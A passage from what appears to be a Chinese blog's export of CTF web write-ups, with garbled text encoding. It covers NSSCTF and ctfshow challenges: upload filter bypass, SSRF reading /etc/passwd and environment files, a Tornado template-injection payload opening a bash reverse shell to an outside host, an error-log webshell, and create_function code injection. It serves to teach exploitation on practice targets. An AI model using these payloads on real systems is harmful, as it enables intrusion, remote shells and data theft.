class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Please re-upload&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éœ€è¦è‡ªå¤‡ä¸€ä¸ªä¸Šä¼ çš„å‰ç«¯ã€‚</p><p>ä¸Šä¼ æ—¶ï¼Œä¸Šä¼ çš„æ–‡ä»¶åä¸º<code>xxx.php/.</code>ï¼Œå³å¯è®©<code>$ext</code>çš„å€¼ä¸ºç©ºï¼Œä»è€Œç»•è¿‡wafã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¦å¯¹æ–‡ä»¶åæ¥ä¸€æ¬¡urlç¼–ç ï¼Œä¸ç„¶ä¼šå‡ºé”™ã€‚ï¼ˆé¢˜ç›®å¯¹æ–‡ä»¶åæ¥äº†ä¸€ä¸ª<code>urldecode</code>ä¹Ÿç®—æ˜¯ä¸€ä¸ªæé†’å§ï¼‰ã€‚flagå°±åœ¨ç¯å¢ƒå˜é‡é‡Œã€‚</p><p><img src="/NSSCTF_2nd_WP/1_1.png" alt="ä¸Šä¼ æ—¶"></p><p><img src="/NSSCTF_2nd_WP/1_2.png" alt="ä¸Šä¼ æˆåŠŸ"></p><h2 id="2å‘¨å¹´å¿«ä¹ï¼"><a href="#2å‘¨å¹´å¿«ä¹ï¼" class="headerlink" title="2å‘¨å¹´å¿«ä¹ï¼"></a>2å‘¨å¹´å¿«ä¹ï¼</h2><p>çº¯å‰ç«¯çš„win12ï¼Œè¦å’Œå‡ºé¢˜äººå¯¹ä¸ªè„‘æ´ï¼ˆ</p><ol><li><p>åœ¨Dç›˜çš„<code>NSSCTF_2nd_WriteUp</code>æ–‡ä»¶å¤¹é‡Œé‡Œå‘ç°ä¸€ä¸ªhintã€‚</p><p><img src="/NSSCTF_2nd_WP/2_1.png"></p></li><li><p>åœ¨æ¡Œé¢çš„è·å–FLAGä¸­å¾—åˆ°å¦ä¸€ä¸ªæœ‰ç”¨çš„ä¿¡æ¯ã€‚</p><p><img src="/NSSCTF_2nd_WP/2_2.png"></p></li><li><p>ç»“åˆä¸Šè¿°æ¡ä»¶ï¼Œå¯ä»¥çŒœæµ‹æ˜¯åœ¨ç»ˆç«¯é‡Œæ‰§è¡Œ<code>curl https://www.nssctf.cn/flag</code>ã€‚</p></li><li><p>æ‰“å¼€ç»ˆç«¯ï¼Œè¾“å…¥é˜Ÿä¼çš„<code>token</code>ï¼Œç„¶åè¾“å…¥<code>curl https://www.nssctf.cn/flag</code>ï¼Œå³å¯å°†flagå‘åˆ°é˜Ÿé•¿çš„ç«™å†…é‚®ç®±é‡Œï¼Œå»æŸ¥çœ‹ç«™å†…æ¶ˆæ¯å°±èƒ½çœ‹åˆ°flagäº†ã€‚</p><p><img src="/NSSCTF_2nd_WP/2_3.png"></p><p><img src="/NSSCTF_2nd_WP/2_4.png"></p></li></ol><h2 id="MyBox"><a href="#MyBox" class="headerlink" title="MyBox"></a>MyBox</h2><p>è¿™ä¸ªé¢˜å­˜åœ¨éé¢„æœŸï¼Œç”¨åˆ°éé¢„æœŸåšçš„ã€‚</p><ol><li><p>æ‰“å¼€é¢˜ç›®ï¼Œåªçœ‹åˆ°ä¸€ä¸ª<code>/?url=dosth</code>ã€‚</p></li><li><p>çŒœæµ‹æ˜¯ssrfï¼Œä½¿ç”¨fileåè®®å°è¯•è¯»æ–‡ä»¶ï¼Œå‘ç°èƒ½è¯»ã€‚<code>/?url=file:///etc/passwd</code></p><p><img src="/NSSCTF_2nd_WP/3_1.png"></p></li><li><p>è¯»<code>/proc/1/environ</code>ï¼Œå³å¯å¾—åˆ°flagã€‚</p><p><img src="/NSSCTF_2nd_WP/3_2.png"></p></li></ol><h2 id="MyHurricane"><a href="#MyHurricane" class="headerlink" title="MyHurricane"></a>MyHurricane</h2><p>tornadoçš„sstiï¼Œç‹ ç‹ åœ°å­¦ä¹ äº†ä¸€æ³¢ã€‚</p><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://blog.csdn.net/miuzzx/article/details/123329244">tornadoæ¨¡æ¿æ³¨å…¥</a></p><p>â€‹   <a href="https://tornado-zh.readthedocs.io/zh/latest/index.html">Tornado å®˜æ–¹æ–‡æ¡£</a></p><ol><li><p>æºç ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.ioloop</span><br><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">BASE_DIR = os.path.dirname(__file__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">data</span>):</span><br><span class="line">    bl = [<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;not&#x27;</span>, <span class="string">&#x27;&#123;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#125;&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> bl:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> chunk <span class="keyword">in</span> data.split():</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> chunk:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">31</span> &lt; <span class="built_in">ord</span>(c) &lt; <span class="number">128</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">IndexHandler</span>(tornado.web.RequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            self.finish(f.read())</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self</span>):</span><br><span class="line">        data = self.get_argument(<span class="string">&quot;ssti&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> waf(data):</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.html&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(<span class="string">f&quot;&quot;&quot;&lt;html&gt;</span></span><br><span class="line"><span class="string">                        &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">                        &lt;body style=&quot;font-size: 30px;&quot;&gt;<span class="subst">&#123;data&#125;</span>&lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string">                        &quot;&quot;&quot;</span>)</span><br><span class="line">                f.flush()</span><br><span class="line">            self.render(<span class="string">&#x27;1.html&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.finish(<span class="string">&#x27;no no no&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app = tornado.web.Application([</span><br><span class="line">            (<span class="string">r&quot;/&quot;</span>, IndexHandler),</span><br><span class="line">        ], compiled_template_cache=<span class="literal">False</span>)</span><br><span class="line">    app.listen(<span class="number">827</span>)</span><br><span class="line">    tornado.ioloop.IOLoop.current().start()</span><br></pre></td></tr></table></figure></li><li><p>ä»æºç å¯ä»¥çœ‹åˆ°ï¼Œpostçš„<code>ssti</code>å‚æ•°é‚£é‡Œå­˜åœ¨sstiã€‚</p></li><li><p>è¿‡æ»¤äº†<code>&#123;&#123;`ã€`&#125;&#125;</code>ã€<code>(</code>ã€<code>)</code>ã€å•åŒå¼•å·ï¼Œæå…¶éº»çƒ¦ã€‚</p></li><li><p>å…ˆå­¦ä¹ ä¸€æ³¢ï¼Œå­¦ä¹ çš„æ—¶å€™åœ¨æœ¬åœ°è°ƒè¯•ï¼Œå¯ä»¥å‘ç°åœ¨æ— è¿‡æ»¤çš„æƒ…å†µä¸‹ï¼Œè¯¥sstiæ˜¯å¯ä»¥ç›´æ¥æ‰§è¡Œ<code>eval</code>çš„ï¼Œä½†åœ¨å‰ç«¯æ˜¯æ²¡æœ‰å›æ˜¾çš„ï¼Œåªè¿”å›500ï¼Œä½†èƒ½åœ¨åå°æ‰§è¡Œå‘½ä»¤ã€‚</p><p><img src="/NSSCTF_2nd_WP/4_1.png"></p><p><img src="/NSSCTF_2nd_WP/4_2.png"></p></li><li><p>ç”±äºè¿‡æ»¤äº†ä¸€äº›ä¸œè¥¿ï¼Œæˆ‘ä»¬éœ€è¦åšä¸€äº›æ›¿æ¢ï¼Œç”¨<code>&#123;% %&#125;</code>ä»£æ›¿<code>&#123;&#123; &#125;&#125;</code>ï¼Œåœ¨æ–‡ç« çš„ä¸‹é¢æˆ‘ä»¬è¿˜çœ‹åˆ°èƒ½ç»•å°æ‹¬å·çš„æ–¹æ³•ã€‚</p><p><img src="/NSSCTF_2nd_WP/4_3.png"></p></li><li><p>ç”±æ­¤æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œæˆ‘ä»¬å¯ä»¥ä¸ç”¨æ‹¬å·æ‰§è¡Œ<code>eval</code>ï¼Œè€Œå‰é¢çš„<code>&#39;print(123)&#39;</code>æ˜¯<code>eval</code>çš„å‚æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä»åˆ«å¤„æ¥æ”¶åˆ°å‚æ•°ï¼Œå³å¯ç»•è¿‡å°æ‹¬å·çš„é™åˆ¶ã€‚</p></li><li><p>åœ¨æ–‡ç« çš„ä¸­é—´è®²äº†<code>request</code>çš„ç”¨æ³•ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>request</code>æ¥ä¼ é€’<code>eval</code>çš„å‚æ•°ã€‚</p><p><img src="/NSSCTF_2nd_WP/4_4.png"></p></li><li><p>æˆ‘ä»¬åœ¨æœ¬åœ°å°è¯•ç”¨<code>request.query</code>ï¼Œå‘ç°èƒ½æˆåŠŸæ‰§è¡Œå‘½ä»¤ã€‚</p><p><img src="/NSSCTF_2nd_WP/4_5.png"></p><p><img src="/NSSCTF_2nd_WP/4_6.png"></p></li><li><p>ä»ä¸Šè¾¹çš„è°ƒè¯•ä¸­ï¼Œæˆ‘ä»¬æˆåŠŸçªç ´äº†é™åˆ¶ï¼Œåœ¨æœåŠ¡å™¨æ‰§è¡Œäº†å‘½ä»¤ï¼Œæ¥ä¸‹æ¥èƒ½æˆåŠŸåå¼¹shellå°±è¡Œäº†ã€‚</p></li><li><p>åœ¨æ–‡ç« çš„æœ«å°¾ï¼Œæˆ‘ä»¬çœ‹åˆ°äº†ä¸€ä¸ªè¿™æ ·çš„payloadï¼Œæˆ‘ä»¬ç›´æ¥æ‹¿æ¥ç”¨å°±è¡Œäº†</p><p><img src="/NSSCTF_2nd_WP/4_7.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__import__(&#x27;os&#x27;).system(&#x27;bash -i &gt;&amp; /dev/tcp/xxx/xxx 0&gt;&amp;1&#x27;)%0a&quot;&quot;&quot;%0a&amp;data=&#123;%autoescape None%&#125;&#123;% raw request.body%0a    _tt_utf8=exec%&#125;&amp;%0a&quot;&quot;&quot;</span><br></pre></td></tr></table></figure></li><li><p>æˆ‘ä»¬ä¿®æ”¹ä¸€ä¸‹ï¼ŒæŠŠ%0aæ›¿æ¢æˆå›è½¦ï¼ŒæŠŠ<code>data</code>æ›¿æ¢æˆ<code>ssti</code>ï¼Œå†å¡«ä¸Šåå¼¹æœåŠ¡å™¨çš„åœ°å€å’Œç«¯å£ï¼Œå³å¯æˆåŠŸåå¼¹shellã€‚</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__import__(&#x27;os&#x27;).system(&#x27;bash -c \&#x27;bash -i &gt;&amp; /dev/tcp/7654du6216.zicp.fun/33699 0&gt;&amp;1\&#x27;&#x27;)</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">&amp;ssti=&#123;%autoescape None%&#125;&#123;% raw request.body%0a    _tt_utf8=exec%&#125;&amp;</span><br><span class="line">&quot;&quot;&quot;</span><br></pre></td></tr></table></figure><p><img src="/NSSCTF_2nd_WP/4_8.png"></p></li><li><p>è§£é‡Šä¸€ä¸‹payloadï¼Œ<code>&#123;%autoescape None%&#125;&#123;%raw ...%&#125;</code>å¯ä»¥ç­‰åŒäº<code>&#123;&#123; &#125;&#125;</code>ï¼Œè¿™ä¸ªåœ¨å®˜æ–¹æ–‡æ¡£ä¸­æœ‰å†™ã€‚</p><p><img src="/NSSCTF_2nd_WP/4_9.png"></p></li><li><p><code>request.body</code>è¿”å›çš„æ˜¯è¯·æ±‚çš„ä¸»ä½“ï¼Œå¯ä»¥ç†è§£ä¸ºè¿”å›äº†posté‡Œçš„æ‰€æœ‰å†…å®¹ã€‚è€Œä¸‹é¢çš„<code>&quot;&quot;&quot;</code>åˆ™æ˜¯èµ·æ³¨é‡Šä½œç”¨ï¼ŒæŠŠæˆ‘ä»¬ä¸éœ€è¦çš„éƒ¨åˆ†æ³¨é‡Šæ‰ï¼Œé˜²æ­¢å‡ºé”™ã€‚</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> NSSCTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> WEB </tag>
            
            <tag> NSSCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshowçº¢åŒ…æŒ‘æˆ˜7_WP</title>
      <link href="/ctfshow%E7%BA%A2%E5%8C%85%E6%8C%91%E6%88%987-WP/"/>
      <url>/ctfshow%E7%BA%A2%E5%8C%85%E6%8C%91%E6%88%987-WP/</url>
      
        <content type="html"><![CDATA[<p>èµ›åå¤ç°</p><p>å®˜æ–¹wpï¼š<a href="https://ctf-show.feishu.cn/docx/IZh0deravoLG66xCrJ6caezNnKc">https://ctf-show.feishu.cn/docx/IZh0deravoLG66xCrJ6caezNnKc</a></p><h1 id="1ã€æºç "><a href="#1ã€æºç " class="headerlink" title="1ã€æºç "></a>1ã€æºç </h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="variable">$name</span>,<span class="variable">$value</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>(</span><br><span class="line">    <span class="string">&quot;ls &#x27;&quot;</span>.<span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]).<span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;`&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;$&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="2ã€é¢˜ç›®è§£æ"><a href="#2ã€é¢˜ç›®è§£æ" class="headerlink" title="2ã€é¢˜ç›®è§£æ"></a>2ã€é¢˜ç›®è§£æ</h1><p>1.å­˜åœ¨<code>extract($_GET);</code>å¯ä»¥å˜é‡è¦†ç›–ï¼Œ<code>ini_set</code>å¯ä»¥ä¿®æ”¹<code>php.ini</code>çš„éƒ¨åˆ†é…ç½®ä¿¡æ¯ï¼Œ<code>filter</code>å‡½æ•°å°† â€˜ ï¼ˆå•å¼•å·ï¼‰ã€ \ ï¼ˆåæ–œæ ï¼‰ã€&#96; (åå¼•å·) ã€$ éƒ½æ›¿æ¢æˆç©ºã€‚</p><p>2.å¸¸è§„æ€è·¯æ˜¯é—­åˆæ‰ â€˜ ï¼ˆå•å¼•å·ï¼‰,ç„¶ååˆ©ç”¨ ; ï¼ˆåˆ†å·ï¼‰æ‰§è¡Œå…¶ä»–bashå‘½ä»¤ï¼Œä½† â€˜ ï¼ˆå•å¼•å·ï¼‰ç”¨ä¸äº†ï¼Œæ— æ³•é—­åˆï¼Œå› æ­¤æ­¤æ–¹æ³•ä¸è¡Œã€‚</p><p>3.ä¿®æ”¹<code>error_log</code>çš„ä¿å­˜è·¯å¾„ä¸º<code>/var/www/html/3.php</code>ï¼Œåˆ©ç”¨æŠ¥é”™å°†æŠ¥é”™ä¿¡æ¯å†™å…¥ï¼Œåœ¨æŠ¥é”™ä¿¡æ¯ä¸­åŒ…å«æƒ³è¦æ‰§è¡Œçš„phpä»£ç ï¼Œä»è€Œå®ç°getshellã€‚</p><p>4.<code>system</code>åˆšå¥½å¯ä»¥ç”¨0å­—èŠ‚è¿›è¡Œæˆªæ–­æ¥è§¦å‘å¼‚å¸¸ï¼Œåœ¨å¼‚å¸¸ä¸­åŠ å…¥phpä»£ç ã€‚</p><p><img src="/ctfshow%E7%BA%A2%E5%8C%85%E6%8C%91%E6%88%987-WP/1.png"></p><p>5.ä¹‹åè®¿é—®<code>3.php</code>ï¼Œå³å¯çœ‹åˆ°flagã€‚</p><p><img src="/ctfshow%E7%BA%A2%E5%8C%85%E6%8C%91%E6%88%987-WP/2.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> çº¢åŒ…æŒ‘æˆ˜ </category>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> WEB </tag>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshowçº¢åŒ…æŒ‘æˆ˜8_WP</title>
      <link href="/ctfshow%E7%BA%A2%E5%8C%85%E6%8C%91%E6%88%988-WP/"/>
      <url>/ctfshow%E7%BA%A2%E5%8C%85%E6%8C%91%E6%88%988-WP/</url>
      
        <content type="html"><![CDATA[<p>å®˜æ–¹WPï¼š<a href="https://ctf-show.feishu.cn/docx/Uy3xdlo9koLQtyxnlUGcpIxunUh?from=from_copylink">https://ctf-show.feishu.cn/docx/Uy3xdlo9koLQtyxnlUGcpIxunUh?from=from_copylink</a></p><h1 id="1ã€æºç "><a href="#1ã€æºç " class="headerlink" title="1ã€æºç "></a>1ã€æºç </h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-08-08 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-08-08 00:26:48</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="variable">$name</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$value</span>))();</span><br></pre></td></tr></table></figure><h1 id="2ã€åˆ†æè¿‡ç¨‹ï¼š"><a href="#2ã€åˆ†æè¿‡ç¨‹ï¼š" class="headerlink" title="2ã€åˆ†æè¿‡ç¨‹ï¼š"></a>2ã€åˆ†æè¿‡ç¨‹ï¼š</h1><ol><li><code>extract($_GET);</code>èƒ½å¤Ÿå®ç°å˜é‡è¦†ç›–ï¼Œå¯ä»¥ç»™<code>$name</code>å’Œ<code>$value</code>èµ‹å€¼ã€‚</li><li>å­˜åœ¨<code>create_function</code>å‡½æ•°ï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªå®ç°rceã€‚</li><li>è‹¥ä¸å­˜åœ¨<code>base64_encode</code>åˆ™å¯ä»¥é€šè¿‡<code>$value</code>å®ç°rceï¼Œç”±äº<code>$value</code>è¢«<code>base64_encode</code>ç ´åï¼Œå¯¼è‡´ä¸å¯æ§ï¼Œå› æ­¤å¯ä»¥è€ƒè™‘ä½¿ç”¨<code>$name</code>ã€‚</li><li>å‚è€ƒè¿™ç¯‡åšå®¢ <a href="https://blog.csdn.net/soldi_er/article/details/116244642?csdn_share_tail=%7B%22type%22:%22blog%22,%22rType%22:%22article%22,%22rId%22:%22116244642%22,%22source%22:%22m0_74044466%22%7D&fromshare=blogdetail">åŒ¿åå‡½æ•°create_function()ä»£ç æ³¨å…¥</a> ï¼Œåªè¦<code>create_function</code>çš„å½¢å‚æœ‰ä¸€ä¸ªå¯æ§ï¼Œéƒ½èƒ½æ‰§è¡Œphpä»£ç ã€‚</li></ol><h1 id="3ã€create-function"><a href="#3ã€create-function" class="headerlink" title="3ã€create_function"></a>3ã€<code>create_function</code></h1><p>å¯¹äº<code>create_function</code>å‡½æ•°ï¼Œä¸èƒ½æŠŠå®ƒå½“æˆä¸€ä¸ªæ™®é€šçš„å‡½æ•°çœ‹å¾…ï¼Œè€Œæ˜¯åº”è¯¥å½“æˆä¸€ä¸ªå‡½æ•°çš„å®šä¹‰è¿‡ç¨‹ã€‚</p><p>æ¯”å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br><span class="line">ç­‰åŒäº</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xxxx</span>(<span class="params">   <span class="variable">$a</span>   </span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line">å…¶ä¸­xxxxä¸ºåŒ¿åå‡½æ•°çš„å‡½æ•°åï¼Œ<span class="variable">$a</span>ä¸ºå½¢å‚ï¼Œ<span class="variable">$b</span>ä¸ºå‡½æ•°å†…æ‰§è¡Œçš„ä»£ç </span><br></pre></td></tr></table></figure><p>ç”±æ­¤æˆ‘ä»¬å¯ä»¥æƒ³ï¼Œæå‰é—­åˆ<code>create_function</code>ï¼Œç»“æŸè¿™ä¸ªå‡½æ•°ï¼Œé‚£ä¹ˆä¸ä¹…èƒ½å°†phpä»£ç é€ƒé€¸å‡ºæ¥äº†ä¹ˆ</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>( <span class="variable">$a</span> , <span class="variable">$b</span> );</span><br><span class="line">è‹¥<span class="variable">$a</span>=<span class="string">&quot;)&#123;&#125;phpinfo();/*&quot;</span></span><br><span class="line">åˆ™ç­‰åŒäº</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xxxx</span>(<span class="params">      </span>)</span>&#123;&#125;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">/*      )</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">$b;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°<code>phpinfo</code>é€ƒäº†å‡ºæ¥ï¼Œä¸ºäº†ä¸æŠ¥é”™ï¼Œä½¿ç”¨<code>/*</code>ï¼ˆæˆ–è€…<code>//</code>ï¼‰æŠŠåé¢çš„æ‰€æœ‰ä»£ç éƒ½æ³¨é‡Šæ‰ï¼Œç”±æ­¤å¯ä»¥å®ç°rceã€‚</p><h1 id="4ã€payload"><a href="#4ã€payload" class="headerlink" title="4ã€payload"></a>4ã€payload</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=)&#123;&#125;system(&quot;cat /f*&quot;);//</span><br></pre></td></tr></table></figure><p><img src="/ctfshow%E7%BA%A2%E5%8C%85%E6%8C%91%E6%88%988-WP/1.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> çº¢åŒ…æŒ‘æˆ˜ </category>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> WEB </tag>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>â€»CTF</title>
      <link href="/%E2%80%BBCTF/"/>
      <url>/%E2%80%BBCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="jwt2struts"><a href="#jwt2struts" class="headerlink" title="jwt2struts"></a>jwt2struts</h2><ol><li>F12ï¼Œå‘ç°æç¤ºã€‚</li></ol><p><img src="/%E2%80%BBCTF/%E4%B8%80.1.1.png"></p><ol start="2"><li><p>è¿›å…¥<code>JWT_key.php</code>ï¼Œå¾—åˆ°æºç ã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./secret_key.php&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./salt.php&quot;</span>;</span><br><span class="line"><span class="comment">//$salt = XXXXXXXXXXXXXX // the salt include 14 characters</span></span><br><span class="line"><span class="comment">//md5($salt.&quot;adminroot&quot;)=e6ccbf12de9d33ec27a5bcfb6a3293df</span></span><br><span class="line">@<span class="variable">$username</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>]);</span><br><span class="line">@<span class="variable">$password</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>]);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;digest&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable">$password</span> != <span class="string">&quot;root&quot;</span>) &#123;</span><br><span class="line">         <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&quot;digest&quot;</span>] === <span class="title function_ invoke__">md5</span>(<span class="variable">$salt</span>.<span class="variable">$username</span>.<span class="variable">$password</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">&quot;The secret_key is &quot;</span>. <span class="variable">$secret_key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">&quot;Your cookies don&#x27;t match up! STOP HACKING THIS SITE.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span 